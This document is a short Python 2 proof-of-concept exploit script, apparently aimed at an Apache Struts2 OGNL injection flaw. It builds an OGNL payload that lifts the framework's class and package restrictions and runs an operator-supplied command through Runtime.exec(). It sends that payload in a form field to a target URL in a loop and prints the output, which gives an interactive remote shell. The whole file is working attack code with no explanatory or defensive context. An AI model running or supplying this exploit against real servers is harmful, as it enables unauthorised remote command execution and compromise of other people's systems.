#!/usr/bin/python

import requests
import sys

def poc(url):
    while True:
        cmd=raw_input('Please enter the command you want to execute:')
        cmd=cmd.strip()
    
        payload = "%{"
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(@java.lang.Runtime@getRuntime().exec('%s'))" % cmd
        payload += "}"


        header={'Referer':''}
        data={'name':payload,'age':24,'__checkbox_bustedBefore':'true','description':1}

        r=requests.post(url,data=data)

        print r.text

if __name__ == '__main__':
    if len(sys.argv)==2:
        url=sys.argv[1]
        if url.startswith('http://') or url.startswith('https://'):
            poc(url)
    else:
        print 'error!!!!'
        sys.exit(0)
